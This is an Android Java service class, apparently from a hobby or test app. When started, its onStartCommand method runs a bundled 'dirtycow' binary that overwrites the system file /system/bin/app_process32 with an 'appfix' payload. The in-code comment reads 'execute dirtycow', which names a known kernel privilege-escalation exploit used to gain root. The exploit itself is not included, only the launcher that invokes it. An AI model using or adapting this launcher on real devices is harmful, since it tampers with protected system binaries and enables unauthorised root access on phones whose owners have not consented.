package com.example.marto.myapplication;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

/**
 * Created by marto on 12/5/16.
 */


public class MyService extends Service {
    private static String mDataDir = "/data/data/com.example.marto.myapplication/";
    private static String mSystemDir = "/system/bin/";

    private boolean runProcess(ProcessBuilder pb) {
        try {
            Process p = pb.start();

            BufferedReader reader =
                    new BufferedReader(new InputStreamReader(p.getInputStream()));
            StringBuilder builder = new StringBuilder();
            String line = null;
            while ((line = reader.readLine()) != null) {
                builder.append(line);
                builder.append(System.getProperty("line.separator"));
            }
            String result = builder.toString();
        } catch (IOException ex) {
            return false;
        }
        return true;
    }
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        //TODO do something useful
        //execute dirtycow
        ProcessBuilder pbAppPatch = new ProcessBuilder(
                mDataDir+"dirtycow", mSystemDir+"app_process32", mDataDir+"appfix");
        runProcess(pbAppPatch);
        /*try {
            Thread.sleep(120000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }*/
        return Service.START_NOT_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        //TODO for communication return IBinder implementation
        return null;
    }
}
